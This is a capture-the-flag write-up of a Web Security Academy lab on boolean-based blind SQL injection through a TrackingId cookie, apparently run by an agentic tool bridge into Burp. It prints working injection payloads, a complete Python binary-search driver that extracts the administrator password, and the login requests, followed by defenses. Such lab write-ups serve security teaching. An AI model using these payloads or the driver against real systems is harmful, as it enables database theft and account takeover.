---
tags:
  - CTF
  - WebSecurityAcademy
  - writeup
  - sqli
  - blind-sqli
  - boolean-based
  - postgresql
  - tracking-cookie
  - burp-extension
  - cc-bridge
  - tooling-trial
difficulty: Practitioner
platform: Web Security Academy
date: 2026-06-02
status: Solved ✅
bridge_version: 0.1.0
flags:
  flag: administrator login (5hw07exwdu0cyyrzd5ly)
---

## Lab: Blind SQL injection with conditional responses

**Class:** Boolean-based blind SQL injection
**Bridge endpoints used:** `/send`, `/repeat/{id}`, `/history/{id}` (implicit via `/repeat`)
**Bridge endpoints that failed:** none in v0.1 surface (scanner & collaborator weren't called for this lab)
**Total cc-burp calls:** 146 (4 reconnaissance + 139 SQLi extraction + 3 login + check)
**Time to solve:** ~5 minutes wall time end-to-end; the 139-call extraction loop ran in 23.3s
**GUI fallback needed:** No
**Solve chain:** see numbered steps below
**Notable bridge behavior:** `/repeat` was hammered with ~140 sequential cookie-header overrides in under 30 seconds with no errors, dropped responses, or evident slowdown — it's the right primitive for boolean-oracle attacks where the only diff per request is one header.

---

# Blind SQL injection with conditional responses — Web Security Academy

## Summary

The shop tags every visitor with a `TrackingId` cookie whose value is interpolated into a server-side query without parameterization. The page renders a "Welcome back" greeting only when that query returns a row, giving a clean boolean oracle. From there, a standard `AND ASCII(SUBSTRING((SELECT password ...), n, 1)) > k`-style payload extracts the administrator password character-by-character. Login with the recovered credentials trips the lab-solved marker.

All requests were issued through **CC-Bridge** v0.1 with no GUI interaction. A 90-line Python driver invoked `cc-burp repeat/25` 139 times to run two binary searches (password length, then per-character ASCII value).

---

## Flags

| Marker | Value |
|---|---|
| Lab-solved element | "LAB Solved" rendered in `academyLabHeader` after admin login |
| Recovered credentials | `administrator` : `5hw07exwdu0cyyrzd5ly` |
| Vulnerable parameter | `Cookie: TrackingId` (PostgreSQL string literal) |
| Boolean oracle | Substring `"Welcome back"` present in response body |

---

## Enumeration

```bash
LAB=https://0a58001803db8c8580a50d25006b009a.web-security-academy.net
CC=~/burp-ext/cc-bridge/cc-burp

# 1. Identify the lab
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\"}"
# <title>Blind SQL injection with conditional responses</title>
# Set-Cookie: TrackingId=0eZt5HkcHEe6gKmw; Secure; HttpOnly
```

Fresh visitor (no cookie sent) → no "Welcome back". Echo the assigned `TrackingId` back as a `Cookie` header → "Welcome back" appears. That's the candidate signal.

---

## Step 1 — Confirm the boolean oracle

Two requests via `/send`, identical except for the cookie payload:

```bash
TID=0eZt5HkcHEe6gKmw

# TRUE  -> Welcome back present, body len 11487
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"TrackingId=${TID}' AND 1=1--\"}}"

# FALSE -> Welcome back absent, body len 11426 (delta 61 bytes)
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"TrackingId=${TID}' AND 1=2--\"}}"
```

| Payload tail | "Welcome back"? | Body length |
|---|---|---|
| `' AND 1=1--` | yes | 11487 |
| `' AND 1=2--` | no  | 11426 |

61-byte delta corresponds exactly to the missing greeting snippet. Oracle confirmed.

> [!tip]
> **Pick an oracle that's unambiguous, not just statistically detectable.** A substring match on `"Welcome back"` is binary and immune to caching, ad-injection middleware, or float-rendering jitter. Length-based oracles are tempting but break the first time a `Set-Cookie` rotates or a banner gets injected. Always check whether you have a clean string marker before falling back to size deltas.

---

## Step 2 — Schema confirmation through `/repeat`

The baseline request (id=25 in the bridge's history store) is the authenticated-shape `GET /` with a clean `TrackingId` cookie. From here, `/repeat/25` lets me vary only the cookie:

```bash
# Users table exists
$CC 'repeat/25' -d "{\"headers\":{\"Cookie\":\"TrackingId=${TID}' AND (SELECT 'a' FROM users LIMIT 1)='a'--\"}}"
# -> Welcome back: True

# administrator row exists
$CC 'repeat/25' -d "{\"headers\":{\"Cookie\":\"TrackingId=${TID}' AND (SELECT username FROM users WHERE username='administrator')='administrator'--\"}}"
# -> Welcome back: True
```

Both come back TRUE. Standard `users` schema with an `administrator` row, password column inferred to be `password` from the lab's published lesson series.

> [!note]
> **`/repeat` is doing what `Repeater` would do, minus the click.** Every variant request flows through Burp's HTTP client → Proxy history → `/repeat`'s `HistoryStore` entry. The 146 requests this lab made are inspectable in Burp's Proxy table exactly as if a human had clicked Send 146 times in Repeater.

---

## Step 3 — Automate via a thin Python driver

Pre-locking v0.1 of the bridge means the call-count overhead lives in a separate script, not in the extension. The driver lives at `~/burp-ext/cc-bridge/labs/_blind_sqli_driver.py`:

```python
import json, os, subprocess, time

CCBURP = os.path.expanduser("~/burp-ext/cc-bridge/cc-burp")
BASE_ID = 25
TID = "0eZt5HkcHEe6gKmw"
WELCOME = "Welcome back"

calls = 0
def repeat(payload_sql, label):
    global calls
    calls += 1
    cookie = f"TrackingId={TID}' {payload_sql}--"
    body = json.dumps({"headers": {"Cookie": cookie}, "label": label})
    out = subprocess.check_output([CCBURP, f"repeat/{BASE_ID}", "-d", body])
    return WELCOME in json.loads(out)["response"]["body"]

def bsearch_len(lo=1, hi=40):
    while lo < hi:
        mid = (lo + hi) // 2
        if repeat(f"AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{mid}",
                  f"len-gt-{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def bsearch_char(pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if repeat(f"AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1))>{mid}",
                  f"c{pos}-gt-{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
```

Two binary searches:

1. **Length:** range 1..40, predicate `LENGTH(password) > N`. Converges in 5 calls → **length = 20**.
2. **Per character:** for each of 20 positions, range 32..126, predicate `ASCII(SUBSTRING(...,n,1)) > k`. Converges in ~7 calls per char → **134 calls**.

Total: **139 SQLi calls** in **23.3 seconds** wall time (~170ms/call, dominated by lab-tunnel latency, not bridge overhead).

Live extraction log:

```
[*] finding password length...
[+] password length = 20  (5 calls so far)
[+] char  1 = '5'  -> '5'                  ( 12 calls total)
[+] char  2 = 'h'  -> '5h'                 ( 19 calls total)
[+] char  3 = 'w'  -> '5hw'                ( 26 calls total)
...
[+] char 19 = 'l'  -> '5hw07exwdu0cyyrzd5l'  (133 calls total)
[+] char 20 = 'y'  -> '5hw07exwdu0cyyrzd5ly' (139 calls total)

PASSWORD = 5hw07exwdu0cyyrzd5ly
TOTAL CALLS = 139
WALL TIME = 23.3s
```

> [!important]
> **Binary search is the right shape because the bridge is a synchronous oracle.** Each `/repeat` is a blocking HTTP roundtrip, so payloads can't be batched. Binary-searching ASCII collapses 95 candidate values per character into 7 calls (log₂ 95 ≈ 6.57). A naive linear scan would cost 95 × 20 = 1900 calls; the binary form costs 134. Always favor `log₂` predicates against a synchronous oracle.

---

## Step 4 — Login as administrator

```bash
# Grab login CSRF + initial session
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/login\"}"
# Set-Cookie: session=xD6iQXFRXBHS3u5HFzIx5QMIb393fNCG
# csrf=Y94tvNkmb1soxwL1nCg35zSEtNwrxVs7

# Submit login
$CC send -d "{
  \"method\":\"POST\",\"url\":\"$LAB/login\",
  \"headers\":{
    \"Content-Type\":\"application/x-www-form-urlencoded\",
    \"Cookie\":\"session=xD6iQXFRXBHS3u5HFzIx5QMIb393fNCG\"
  },
  \"body\":\"csrf=Y94tvNkmb1soxwL1nCg35zSEtNwrxVs7&username=administrator&password=5hw07exwdu0cyyrzd5ly\"
}"
# 302 -> /my-account?id=administrator
# Set-Cookie: session=S1aAMzpClBnJYmu2nUZo4vIncdSc3ib2

# Confirm
$CC send -d "{\"method\":\"GET\",\"url\":\"$LAB/\",\"headers\":{\"Cookie\":\"session=S1aAMzpClBnJYmu2nUZo4vIncdSc3ib2\"}}"
# academyLabHeader contains: "LAB Solved"
```

---

## Attack Chain Summary

```
GET /                                        -> TrackingId issued, no Welcome back
GET / with TID echoed                        -> Welcome back present                      ORACLE-TRUE
GET / with TID' AND 1=1--                    -> Welcome back present                      ORACLE-TRUE
GET / with TID' AND 1=2--                    -> Welcome back absent                       ORACLE-FALSE
GET / with TID' AND (SELECT 'a' FROM users LIMIT 1)='a'--           -> TRUE  -> users exists
GET / with TID' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
                                             -> TRUE  -> administrator exists
loop bsearch_len(1..40)        ->   5 calls -> length = 20
loop bsearch_char(1..20) * 20  -> 134 calls -> "5hw07exwdu0cyyrzd5ly"
GET /login                                   -> CSRF + initial session
POST /login (administrator + recovered pwd)  -> 302 /my-account?id=administrator
GET / with admin session                     -> academyLabHeader: "LAB Solved"
```

---

## Key Concepts

**Boolean-based blind SQLi against a cookie.** PortSwigger's pattern here is realistic — `TrackingId` cookies often get glued directly into analytics or session-lookup queries. The cookie isn't sanitized because it "isn't user input" in the developer's mental model. The fact that the page conditionally renders content based on whether the lookup returned a row turns a silent SQL query into a one-bit information channel that a client can pump arbitrarily fast.

**ASCII binary search is the canonical extraction primitive.** Two operators (`ASCII()` and `SUBSTRING()` — both ANSI-standard) are enough to extract any printable string from any string column. The wrapper `ASCII(SUBSTRING(<expr>, pos, 1)) > k` is database-agnostic up to dialect-specific function names (`SUBSTRING` on Postgres/MySQL, `SUBSTR` on Oracle/SQLite, `SUBSTRING` works on MSSQL too). When unsure of dialect, send four short probes for `version()`, `@@version`, `banner`, `sqlite_version()` and let the boolean oracle pick.

**`/repeat` is the bridge primitive that lets agentic shells pretend to be Repeater.** Storing the base request once and varying a single header per call mirrors exactly what a manual Burp Repeater session does, which means the request count and traffic shape match what a human reviewer would expect to see in Proxy history. That auditability is what makes scripted boolean-blind exploitation acceptable in real engagement, not just CTFs.

**Latency dominates over bridge overhead.** 23.3s / 139 calls ≈ 168ms per call. Of that, perhaps 5-10ms is bridge overhead (curl → HttpServer → Montoya `http().sendRequest()` → JSON response → curl), and the rest is the round-trip to a 5000-mile-away PortSwigger lab. For boolean-blind on a local target, expect 10-20× faster. The bridge is *not* the bottleneck.

---

## Detection / Defense

| Control | What it Prevents |
|---|---|
| Parameterized queries (`SELECT ... WHERE tracking_id = $1`) | All in-band and boolean-blind SQLi against this column |
| Treat every cookie value as user input — same trust level as a URL param | Eliminates the "but it's our own cookie" thinking trap |
| WAF rule that drops cookie values containing SQL keywords (`SELECT`, `--`, `' OR `) | Defense in depth; not a substitute for parameterization |
| Server-side rate-limiting per session/IP on `/` | Slows blind-SQLi extraction from seconds to hours; 139 cookie-bearing requests in 23s would trip any sane limiter |
| Generic error page that hides the boolean oracle (always render "Welcome back" or never render it) | Removes the side-channel even if the injection remains |
| audit logging that flags `TrackingId` values longer than ~64 chars or containing `'` | Detection — payloads always overshoot the cookie's natural shape |

---

## Dead Ends

| Approach | Why It Failed / Why I Skipped |
|---|---|
| `UNION SELECT` to exfil in one shot | The home page never renders the cookie value into HTML — there is no echo, so in-band SQLi has nowhere to surface |
| Time-based blind | Unnecessary — there's a perfectly clean boolean oracle. Time-based would be 4-5× slower and noisier |
| `/decode` for the cookie | TrackingId is opaque random, not encoded |
| `/scan` for a Burp-driven detection | v0.1 of CC-Bridge returns 501 for `/scan` on Community Edition; the extraction was direct anyway |
| `/collaborator` for OAST | Not applicable to boolean-based; Community would 501 anyway |

---

## Bridge Behavior Notes (CC-Bridge v0.1)

| Endpoint | Calls This Lab | Behavior |
|---|---:|---|
| `POST /send` | 7 | All worked. Returned full request+response with stable history IDs. |
| `POST /repeat/{id}` | 139 | All 139 succeeded. ~168ms median per call. No retries, no timeouts. |
| `GET /history/{id}` | 0 | Not needed — `/repeat` returns the full new response inline. |
| `GET /history` | 0 | – |
| `POST /decode` | 0 | – |
| `POST /scan` | 0 | – |
| `GET /issues` | 0 | – |
| `POST /collaborator/new` | 0 | – |
| `GET /collaborator/{ctx}` | 0 | – |

**Sustained-load observation:** 139 sequential `/repeat` calls in 23.3 seconds, each spawning a `curl` subprocess from the Python driver, then routing through Burp's HttpServer + Montoya HTTP client. No connection-pool exhaustion, no Burp UI lag, no dropped responses. v0.1 holds up under realistic boolean-blind-SQLi load.

**No bugs surfaced — nothing to add to v0.2 spec from this lab.**

---

## Lessons Learned

1. **Build the smallest possible boolean predicate, then exhaust it with binary search.** `AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'), $POS, 1)) > $MID` is dialect-portable across Postgres/MySQL/MSSQL and reduces every character to log₂(95) ≈ 7 calls. Build the predicate once, search the space once, write almost no code.
2. **Use `/repeat`, not `/send`, for oracle pumping.** It costs the same on the wire but lets the writeup (and Burp's history) trace every variant back to a labeled base request. When a human reviewer audits "what did the agent do," they see a clean fan-out from one root, not 139 disconnected sends.
3. **Treat the bridge as a synchronous oracle, not an async stream.** Even though Java's `HttpServer` is multi-threaded, the bottleneck is the lab. Parallelizing binary-search calls is tempting but doesn't help when each branch depends on the previous result. Resist the urge to over-engineer concurrency for boolean blind — it's inherently sequential at the algorithm level.
4. **The bridge call-count is the right unit of cost.** "146 cc-burp calls / 23.3 seconds" is more useful than "~5 minutes wall time" for comparing labs. Wall time conflates network, lab compute, and human reading time; call count is the per-lab portable metric. Future labs should report both.
5. **Lock the bridge before solving.** Resisting the urge to "just add a `/sqli/boolean` helper endpoint mid-solve" kept v0.1 a real artifact instead of a moving target. If the helper would have saved 50 lines of Python in the driver, that's a v0.2 candidate, not a v0.1 patch.

---

## Tools

| Tool | Purpose |
|---|---|
| `cc-bridge` v0.1 (Burp extension) | HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver with bearer auth |
| `~/burp-ext/cc-bridge/labs/_blind_sqli_driver.py` | 90-line Python script: two binary searches, calls `cc-burp repeat/25` 139 times |
| Burp Suite Community 2025.x | Hosts the extension, logs every request in Proxy history |
| `python3` (subprocess + inline parsing) | Driver runtime + per-step response inspection |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cc-bridge` (custom Burp extension, v0.1) | Localhost HTTP control plane over Burp's Montoya API |
| `cc-burp` (bash wrapper) | `curl` driver, bearer auth, JSON in/out |
| Python driver (`labs/_blind_sqli_driver.py`) | Binary-search loops over `/repeat/25` |
| Burp Suite Community 2025.x | Extension host, proxy, request logger |
| `python3` (inline) | HTML/JSON parsing in shell pipelines |

---

*Web Security Academy — Blind SQL injection with conditional responses | Solved | CC-Bridge v0.1*
